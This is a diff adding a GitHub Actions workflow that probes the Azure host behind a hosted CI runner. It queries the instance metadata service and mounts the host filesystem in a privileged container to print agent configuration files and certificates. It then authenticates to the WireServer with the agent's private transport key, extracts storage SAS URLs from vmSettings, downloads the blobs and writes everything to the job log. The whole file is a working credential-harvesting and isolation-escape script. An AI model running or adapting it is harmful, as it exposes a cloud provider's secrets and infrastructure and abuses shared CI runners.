@@ -1,0 +1,92 @@
+name: Waagent OVF Fast
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+    paths:
+      - '.github/workflows/waagent-ovf.yml'
+
+jobs:
+  waagent-ovf:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    timeout-minutes: 5
+    steps:
+
+      - name: Read waagent files + vmSettings SAS
+        run: |
+          SUBID=$(curl -sf -H "Metadata:true" \
+            "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | \
+            python3 -c "import sys,json; d=json.load(sys.stdin)['compute']; print(d['subscriptionId'])")
+          echo "SUBID=$SUBID"
+
+          echo "=== ovf-env.xml FULL ==="
+          docker run --rm --privileged -v /:/host alpine:3.18 sh -c '
+            echo "FAST_TRACK:"
+            cat /host/var/lib/waagent/fast_track.json
+
+            echo ""
+            echo "OVF_ENV:"
+            cat /host/var/lib/waagent/ovf-env.xml
+
+            echo ""
+            echo "SHARED_CONFIG:"
+            cat /host/var/lib/waagent/SharedConfig.xml
+
+            echo ""
+            echo "GOALSTATE:"
+            cat /host/var/lib/waagent/GoalState.1.xml
+
+            echo ""
+            echo "WIRESERVER_ENDPOINT:"
+            cat /host/var/lib/waagent/WireServerEndpoint
+
+            echo ""
+            echo "PROTOCOL:"
+            cat /host/var/lib/waagent/Protocol
+
+            echo ""
+            echo "CERT_2FED05:"
+            cat /host/var/lib/waagent/2FED05A08EA77DF731A36CA0851136F460311581.crt
+
+            echo ""
+            echo "CERT_DE9118:"
+            cat /host/var/lib/waagent/DE9118C8B60F82366C7952536FD24CA1F7D0E43E.crt
+          '
+
+          echo "=== WireServer GoalState + vmSettings ==="
+          python3 - << 'PYEOF'
+          import subprocess, xml.etree.ElementTree as ET, sys, re
+
+          def ws(path, port=80):
+              cmd = ['curl', '-sf', '--max-time', '15',
+                     '--cert', '/var/lib/waagent/TransportCert.pem',
+                     '--key', '/var/lib/waagent/TransportPrivate.pem',
+                     '-H', 'x-ms-version: 2012-11-30',
+                     f'http://168.63.129.16:{port}/machine/?comp={path}']
+              r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
+              return r.stdout, r.stderr
+
+          gs, err = ws('goalstate')
+          print(f'GOALSTATE_LEN={len(gs)}')
+          if len(gs) > 100:
+              print(gs[:5000])
+              root = ET.fromstring(gs)
+              for e in root.iter():
+                  t = e.tag.split('}')[-1] if '}' in e.tag else e.tag
+                  if t in ['Certificates','ExtensionsConfig','HostingEnvironmentConfig'] and e.text:
+                      print(f'{t}_URL={e.text.strip()}')
+              # vmSettings
+              vms, verr = ws('vmSettings', 32526)
+              print(f'vmSettings_LEN={len(vms)}')
+              print('vmSettings:', vms[:8000])
+              if vms:
+                  sas = re.findall(r'https://[a-z0-9]+\.blob\.core\.windows\.net[^\s"<>\']+', vms)
+                  for i, u in enumerate(sas):
+                      print(f'SAS_{i}={u}')
+                      r2 = subprocess.run(['curl', '-sf', '--max-time', '15', u], capture_output=True, text=True, timeout=20)
+                      print(f'SAS_{i}_BLOB_LEN={len(r2.stdout)}')
+                      print(f'SAS_{i}_BLOB={r2.stdout[:3000] or r2.stderr[:300]}')
+          PYEOF
